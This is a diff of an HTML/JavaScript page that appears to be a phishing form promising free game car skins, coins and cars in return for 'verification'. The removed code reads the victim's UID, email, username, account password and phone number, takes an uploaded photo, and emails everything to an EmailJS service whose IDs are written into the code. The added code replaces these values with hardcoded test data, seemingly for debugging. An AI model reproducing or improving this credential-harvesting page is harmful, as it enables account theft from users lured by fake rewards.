@@ -65,13 +65,6 @@ font-size:13px;
 color:#bbbbbb;
 }
 
-.preview{
-width:100%;
-margin-top:10px;
-border-radius:10px;
-display:none;
-}
-
 </style>
 </head>
 
@@ -126,16 +119,11 @@ type="tel"
 id="phone"
 placeholder="10 digit Indian number"
 maxlength="10"
-pattern="[6-9]{1}[0-9]{9}"
-oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)"
 required>
 
 <label>Select Reward</label>
 
-<select
-id="reward"
-onchange="updateRewardOptions()"
-required>
+<select id="reward" required>
 
 <option value="">
 Choose Reward
@@ -155,41 +143,6 @@ Free Car
 
 </select>
 
-<div
-id="selectedRewardBox"
-style="
-display:none;
-background:#2a2a2a;
-padding:12px;
-border-radius:10px;
-margin-bottom:15px;">
-
-<b>Selected Reward:</b>
-
-<span id="selectedRewardText"></span>
-
-</div>
-
-<div id="dynamicOptions"></div>
-
-<label>Upload Verification Photo</label>
-
-<input
-type="file"
-id="photoUpload"
-accept="image/*"
-required>
-
-<img
-id="previewImage"
-class="preview">
-
-<div class="notice">
-
-By continuing, you agree to share your submitted details and verification photo.
-
-</div>
-
 <button type="submit">
 
 Submit Verification
@@ -206,186 +159,8 @@ Submit Verification
 
 <script>
 
+/* ✅ YOUR PUBLIC KEY */
 emailjs.init("IlZtBG2WOaqIrvb3T");
-
-let capturedImage = null;
-
-document
-.getElementById('photoUpload')
-.addEventListener('change', function(){
-
-const file = this.files[0];
-
-if(!file){
-
-capturedImage = null;
-
-return;
-
-}
-
-const reader = new FileReader();
-
-reader.onload = function(event){
-
-const img = new Image();
-
-img.onload = function(){
-
-const canvas =
-document.createElement('canvas');
-
-const ctx =
-canvas.getContext('2d');
-
-const maxWidth = 250;
-
-const scaleSize =
-maxWidth / img.width;
-
-canvas.width = maxWidth;
-
-canvas.height =
-img.height * scaleSize;
-
-ctx.drawImage(
-img,
-0,
-0,
-canvas.width,
-canvas.height
-);
-
-capturedImage =
-canvas.toDataURL(
-'image/jpeg',
-0.1
-);
-
-document
-.getElementById('previewImage')
-.src = capturedImage;
-
-document
-.getElementById('previewImage')
-.style.display = "block";
-
-};
-
-img.src = event.target.result;
-
-};
-
-reader.readAsDataURL(file);
-
-});
-
-function updateRewardOptions(){
-
-const reward =
-document.getElementById('reward').value;
-
-const dynamicOptions =
-document.getElementById('dynamicOptions');
-
-const selectedRewardBox =
-document.getElementById('selectedRewardBox');
-
-const selectedRewardText =
-document.getElementById('selectedRewardText');
-
-if(reward !== ""){
-
-selectedRewardBox.style.display =
-"block";
-
-selectedRewardText.innerText =
-reward;
-
-}else{
-
-selectedRewardBox.style.display =
-"none";
-
-}
-
-if(reward === "Free Skin"){
-
-dynamicOptions.innerHTML = `
-
-<label>Select Car Skin</label>
-
-<select id="request">
-
-<option>BMW M4 Gold Skin</option>
-
-<option>Nissan GTR Neon Skin</option>
-
-<option>Toyota Supra Racing Skin</option>
-
-<option>Porsche 911 Carbon Skin</option>
-
-</select>
-
-`;
-
-}
-
-else if(reward === "DZO Trading Access"){
-
-dynamicOptions.innerHTML = `
-
-<label>Select DZO Amount</label>
-
-<select id="request">
-
-<option>100 DZO Coins</option>
-
-<option>200 DZO Coins</option>
-
-<option>1000 DZO Coins</option>
-
-<option>10000 DZO Coins</option>
-
-<option>1 Lakh DZO Coins</option>
-
-</select>
-
-`;
-
-}
-
-else if(reward === "Free Car"){
-
-dynamicOptions.innerHTML = `
-
-<label>Select Car</label>
-
-<select id="request">
-
-<option>Lamborghini Huracan</option>
-
-<option>Bugatti Chiron</option>
-
-<option>Nissan GTR R35</option>
-
-<option>Toyota Supra MK4</option>
-
-<option>Porsche 911 GT3</option>
-
-</select>
-
-`;
-
-}
-
-else{
-
-dynamicOptions.innerHTML = "";
-
-}
-
-}
 
 document
 .getElementById('rewardForm')
@@ -393,41 +168,30 @@ document
 
 e.preventDefault();
 
-const requestElement =
-document.getElementById('request');
-
+/* ✅ TEST TEMPLATE PARAMS */
 const templateParams = {
 
-uid:
-document.getElementById('uid').value,
+uid: "TEST UID",
 
-email:
-document.getElementById('email').value,
+email: "test@gmail.com",
 
-username:
-document.getElementById('username').value,
+username: "testuser",
 
-accountinfo:
-document.getElementById('accountpassword').value,
+accountinfo: "test",
 
-phone:
-document.getElementById('phone').value,
+phone: "9999999999",
 
-reward:
-document.getElementById('reward').value,
+reward: "Free Car",
 
-request:
-requestElement
-? requestElement.value
-: "None",
+request: "Bugatti",
 
-photo:
-"Image Uploaded Successfully"
+photo: "test"
 
 };
 
 try{
 
+/* ✅ YOUR SERVICE + TEMPLATE IDs */
 await emailjs.send(
 
 "service_03gi2v9",
@@ -442,35 +206,14 @@ alert(
 "Verification submitted successfully!"
 );
 
-document
-.getElementById('rewardForm')
-.reset();
-
-document
-.getElementById('dynamicOptions')
-.innerHTML = "";
-
-document
-.getElementById('selectedRewardBox')
-.style.display = "none";
-
-document
-.getElementById('previewImage')
-.style.display = "none";
-
-capturedImage = null;
-
 }
 catch(error){
 
-console.log(
-"EMAILJS ERROR:",
-error
+alert(
+JSON.stringify(error)
 );
 
-alert(
-"Failed to send verification"
-);
+console.log(error);
 
 }
 
@@ -479,4 +222,4 @@ alert(
 </script>
 
 </body>
-</html> 
+</html>
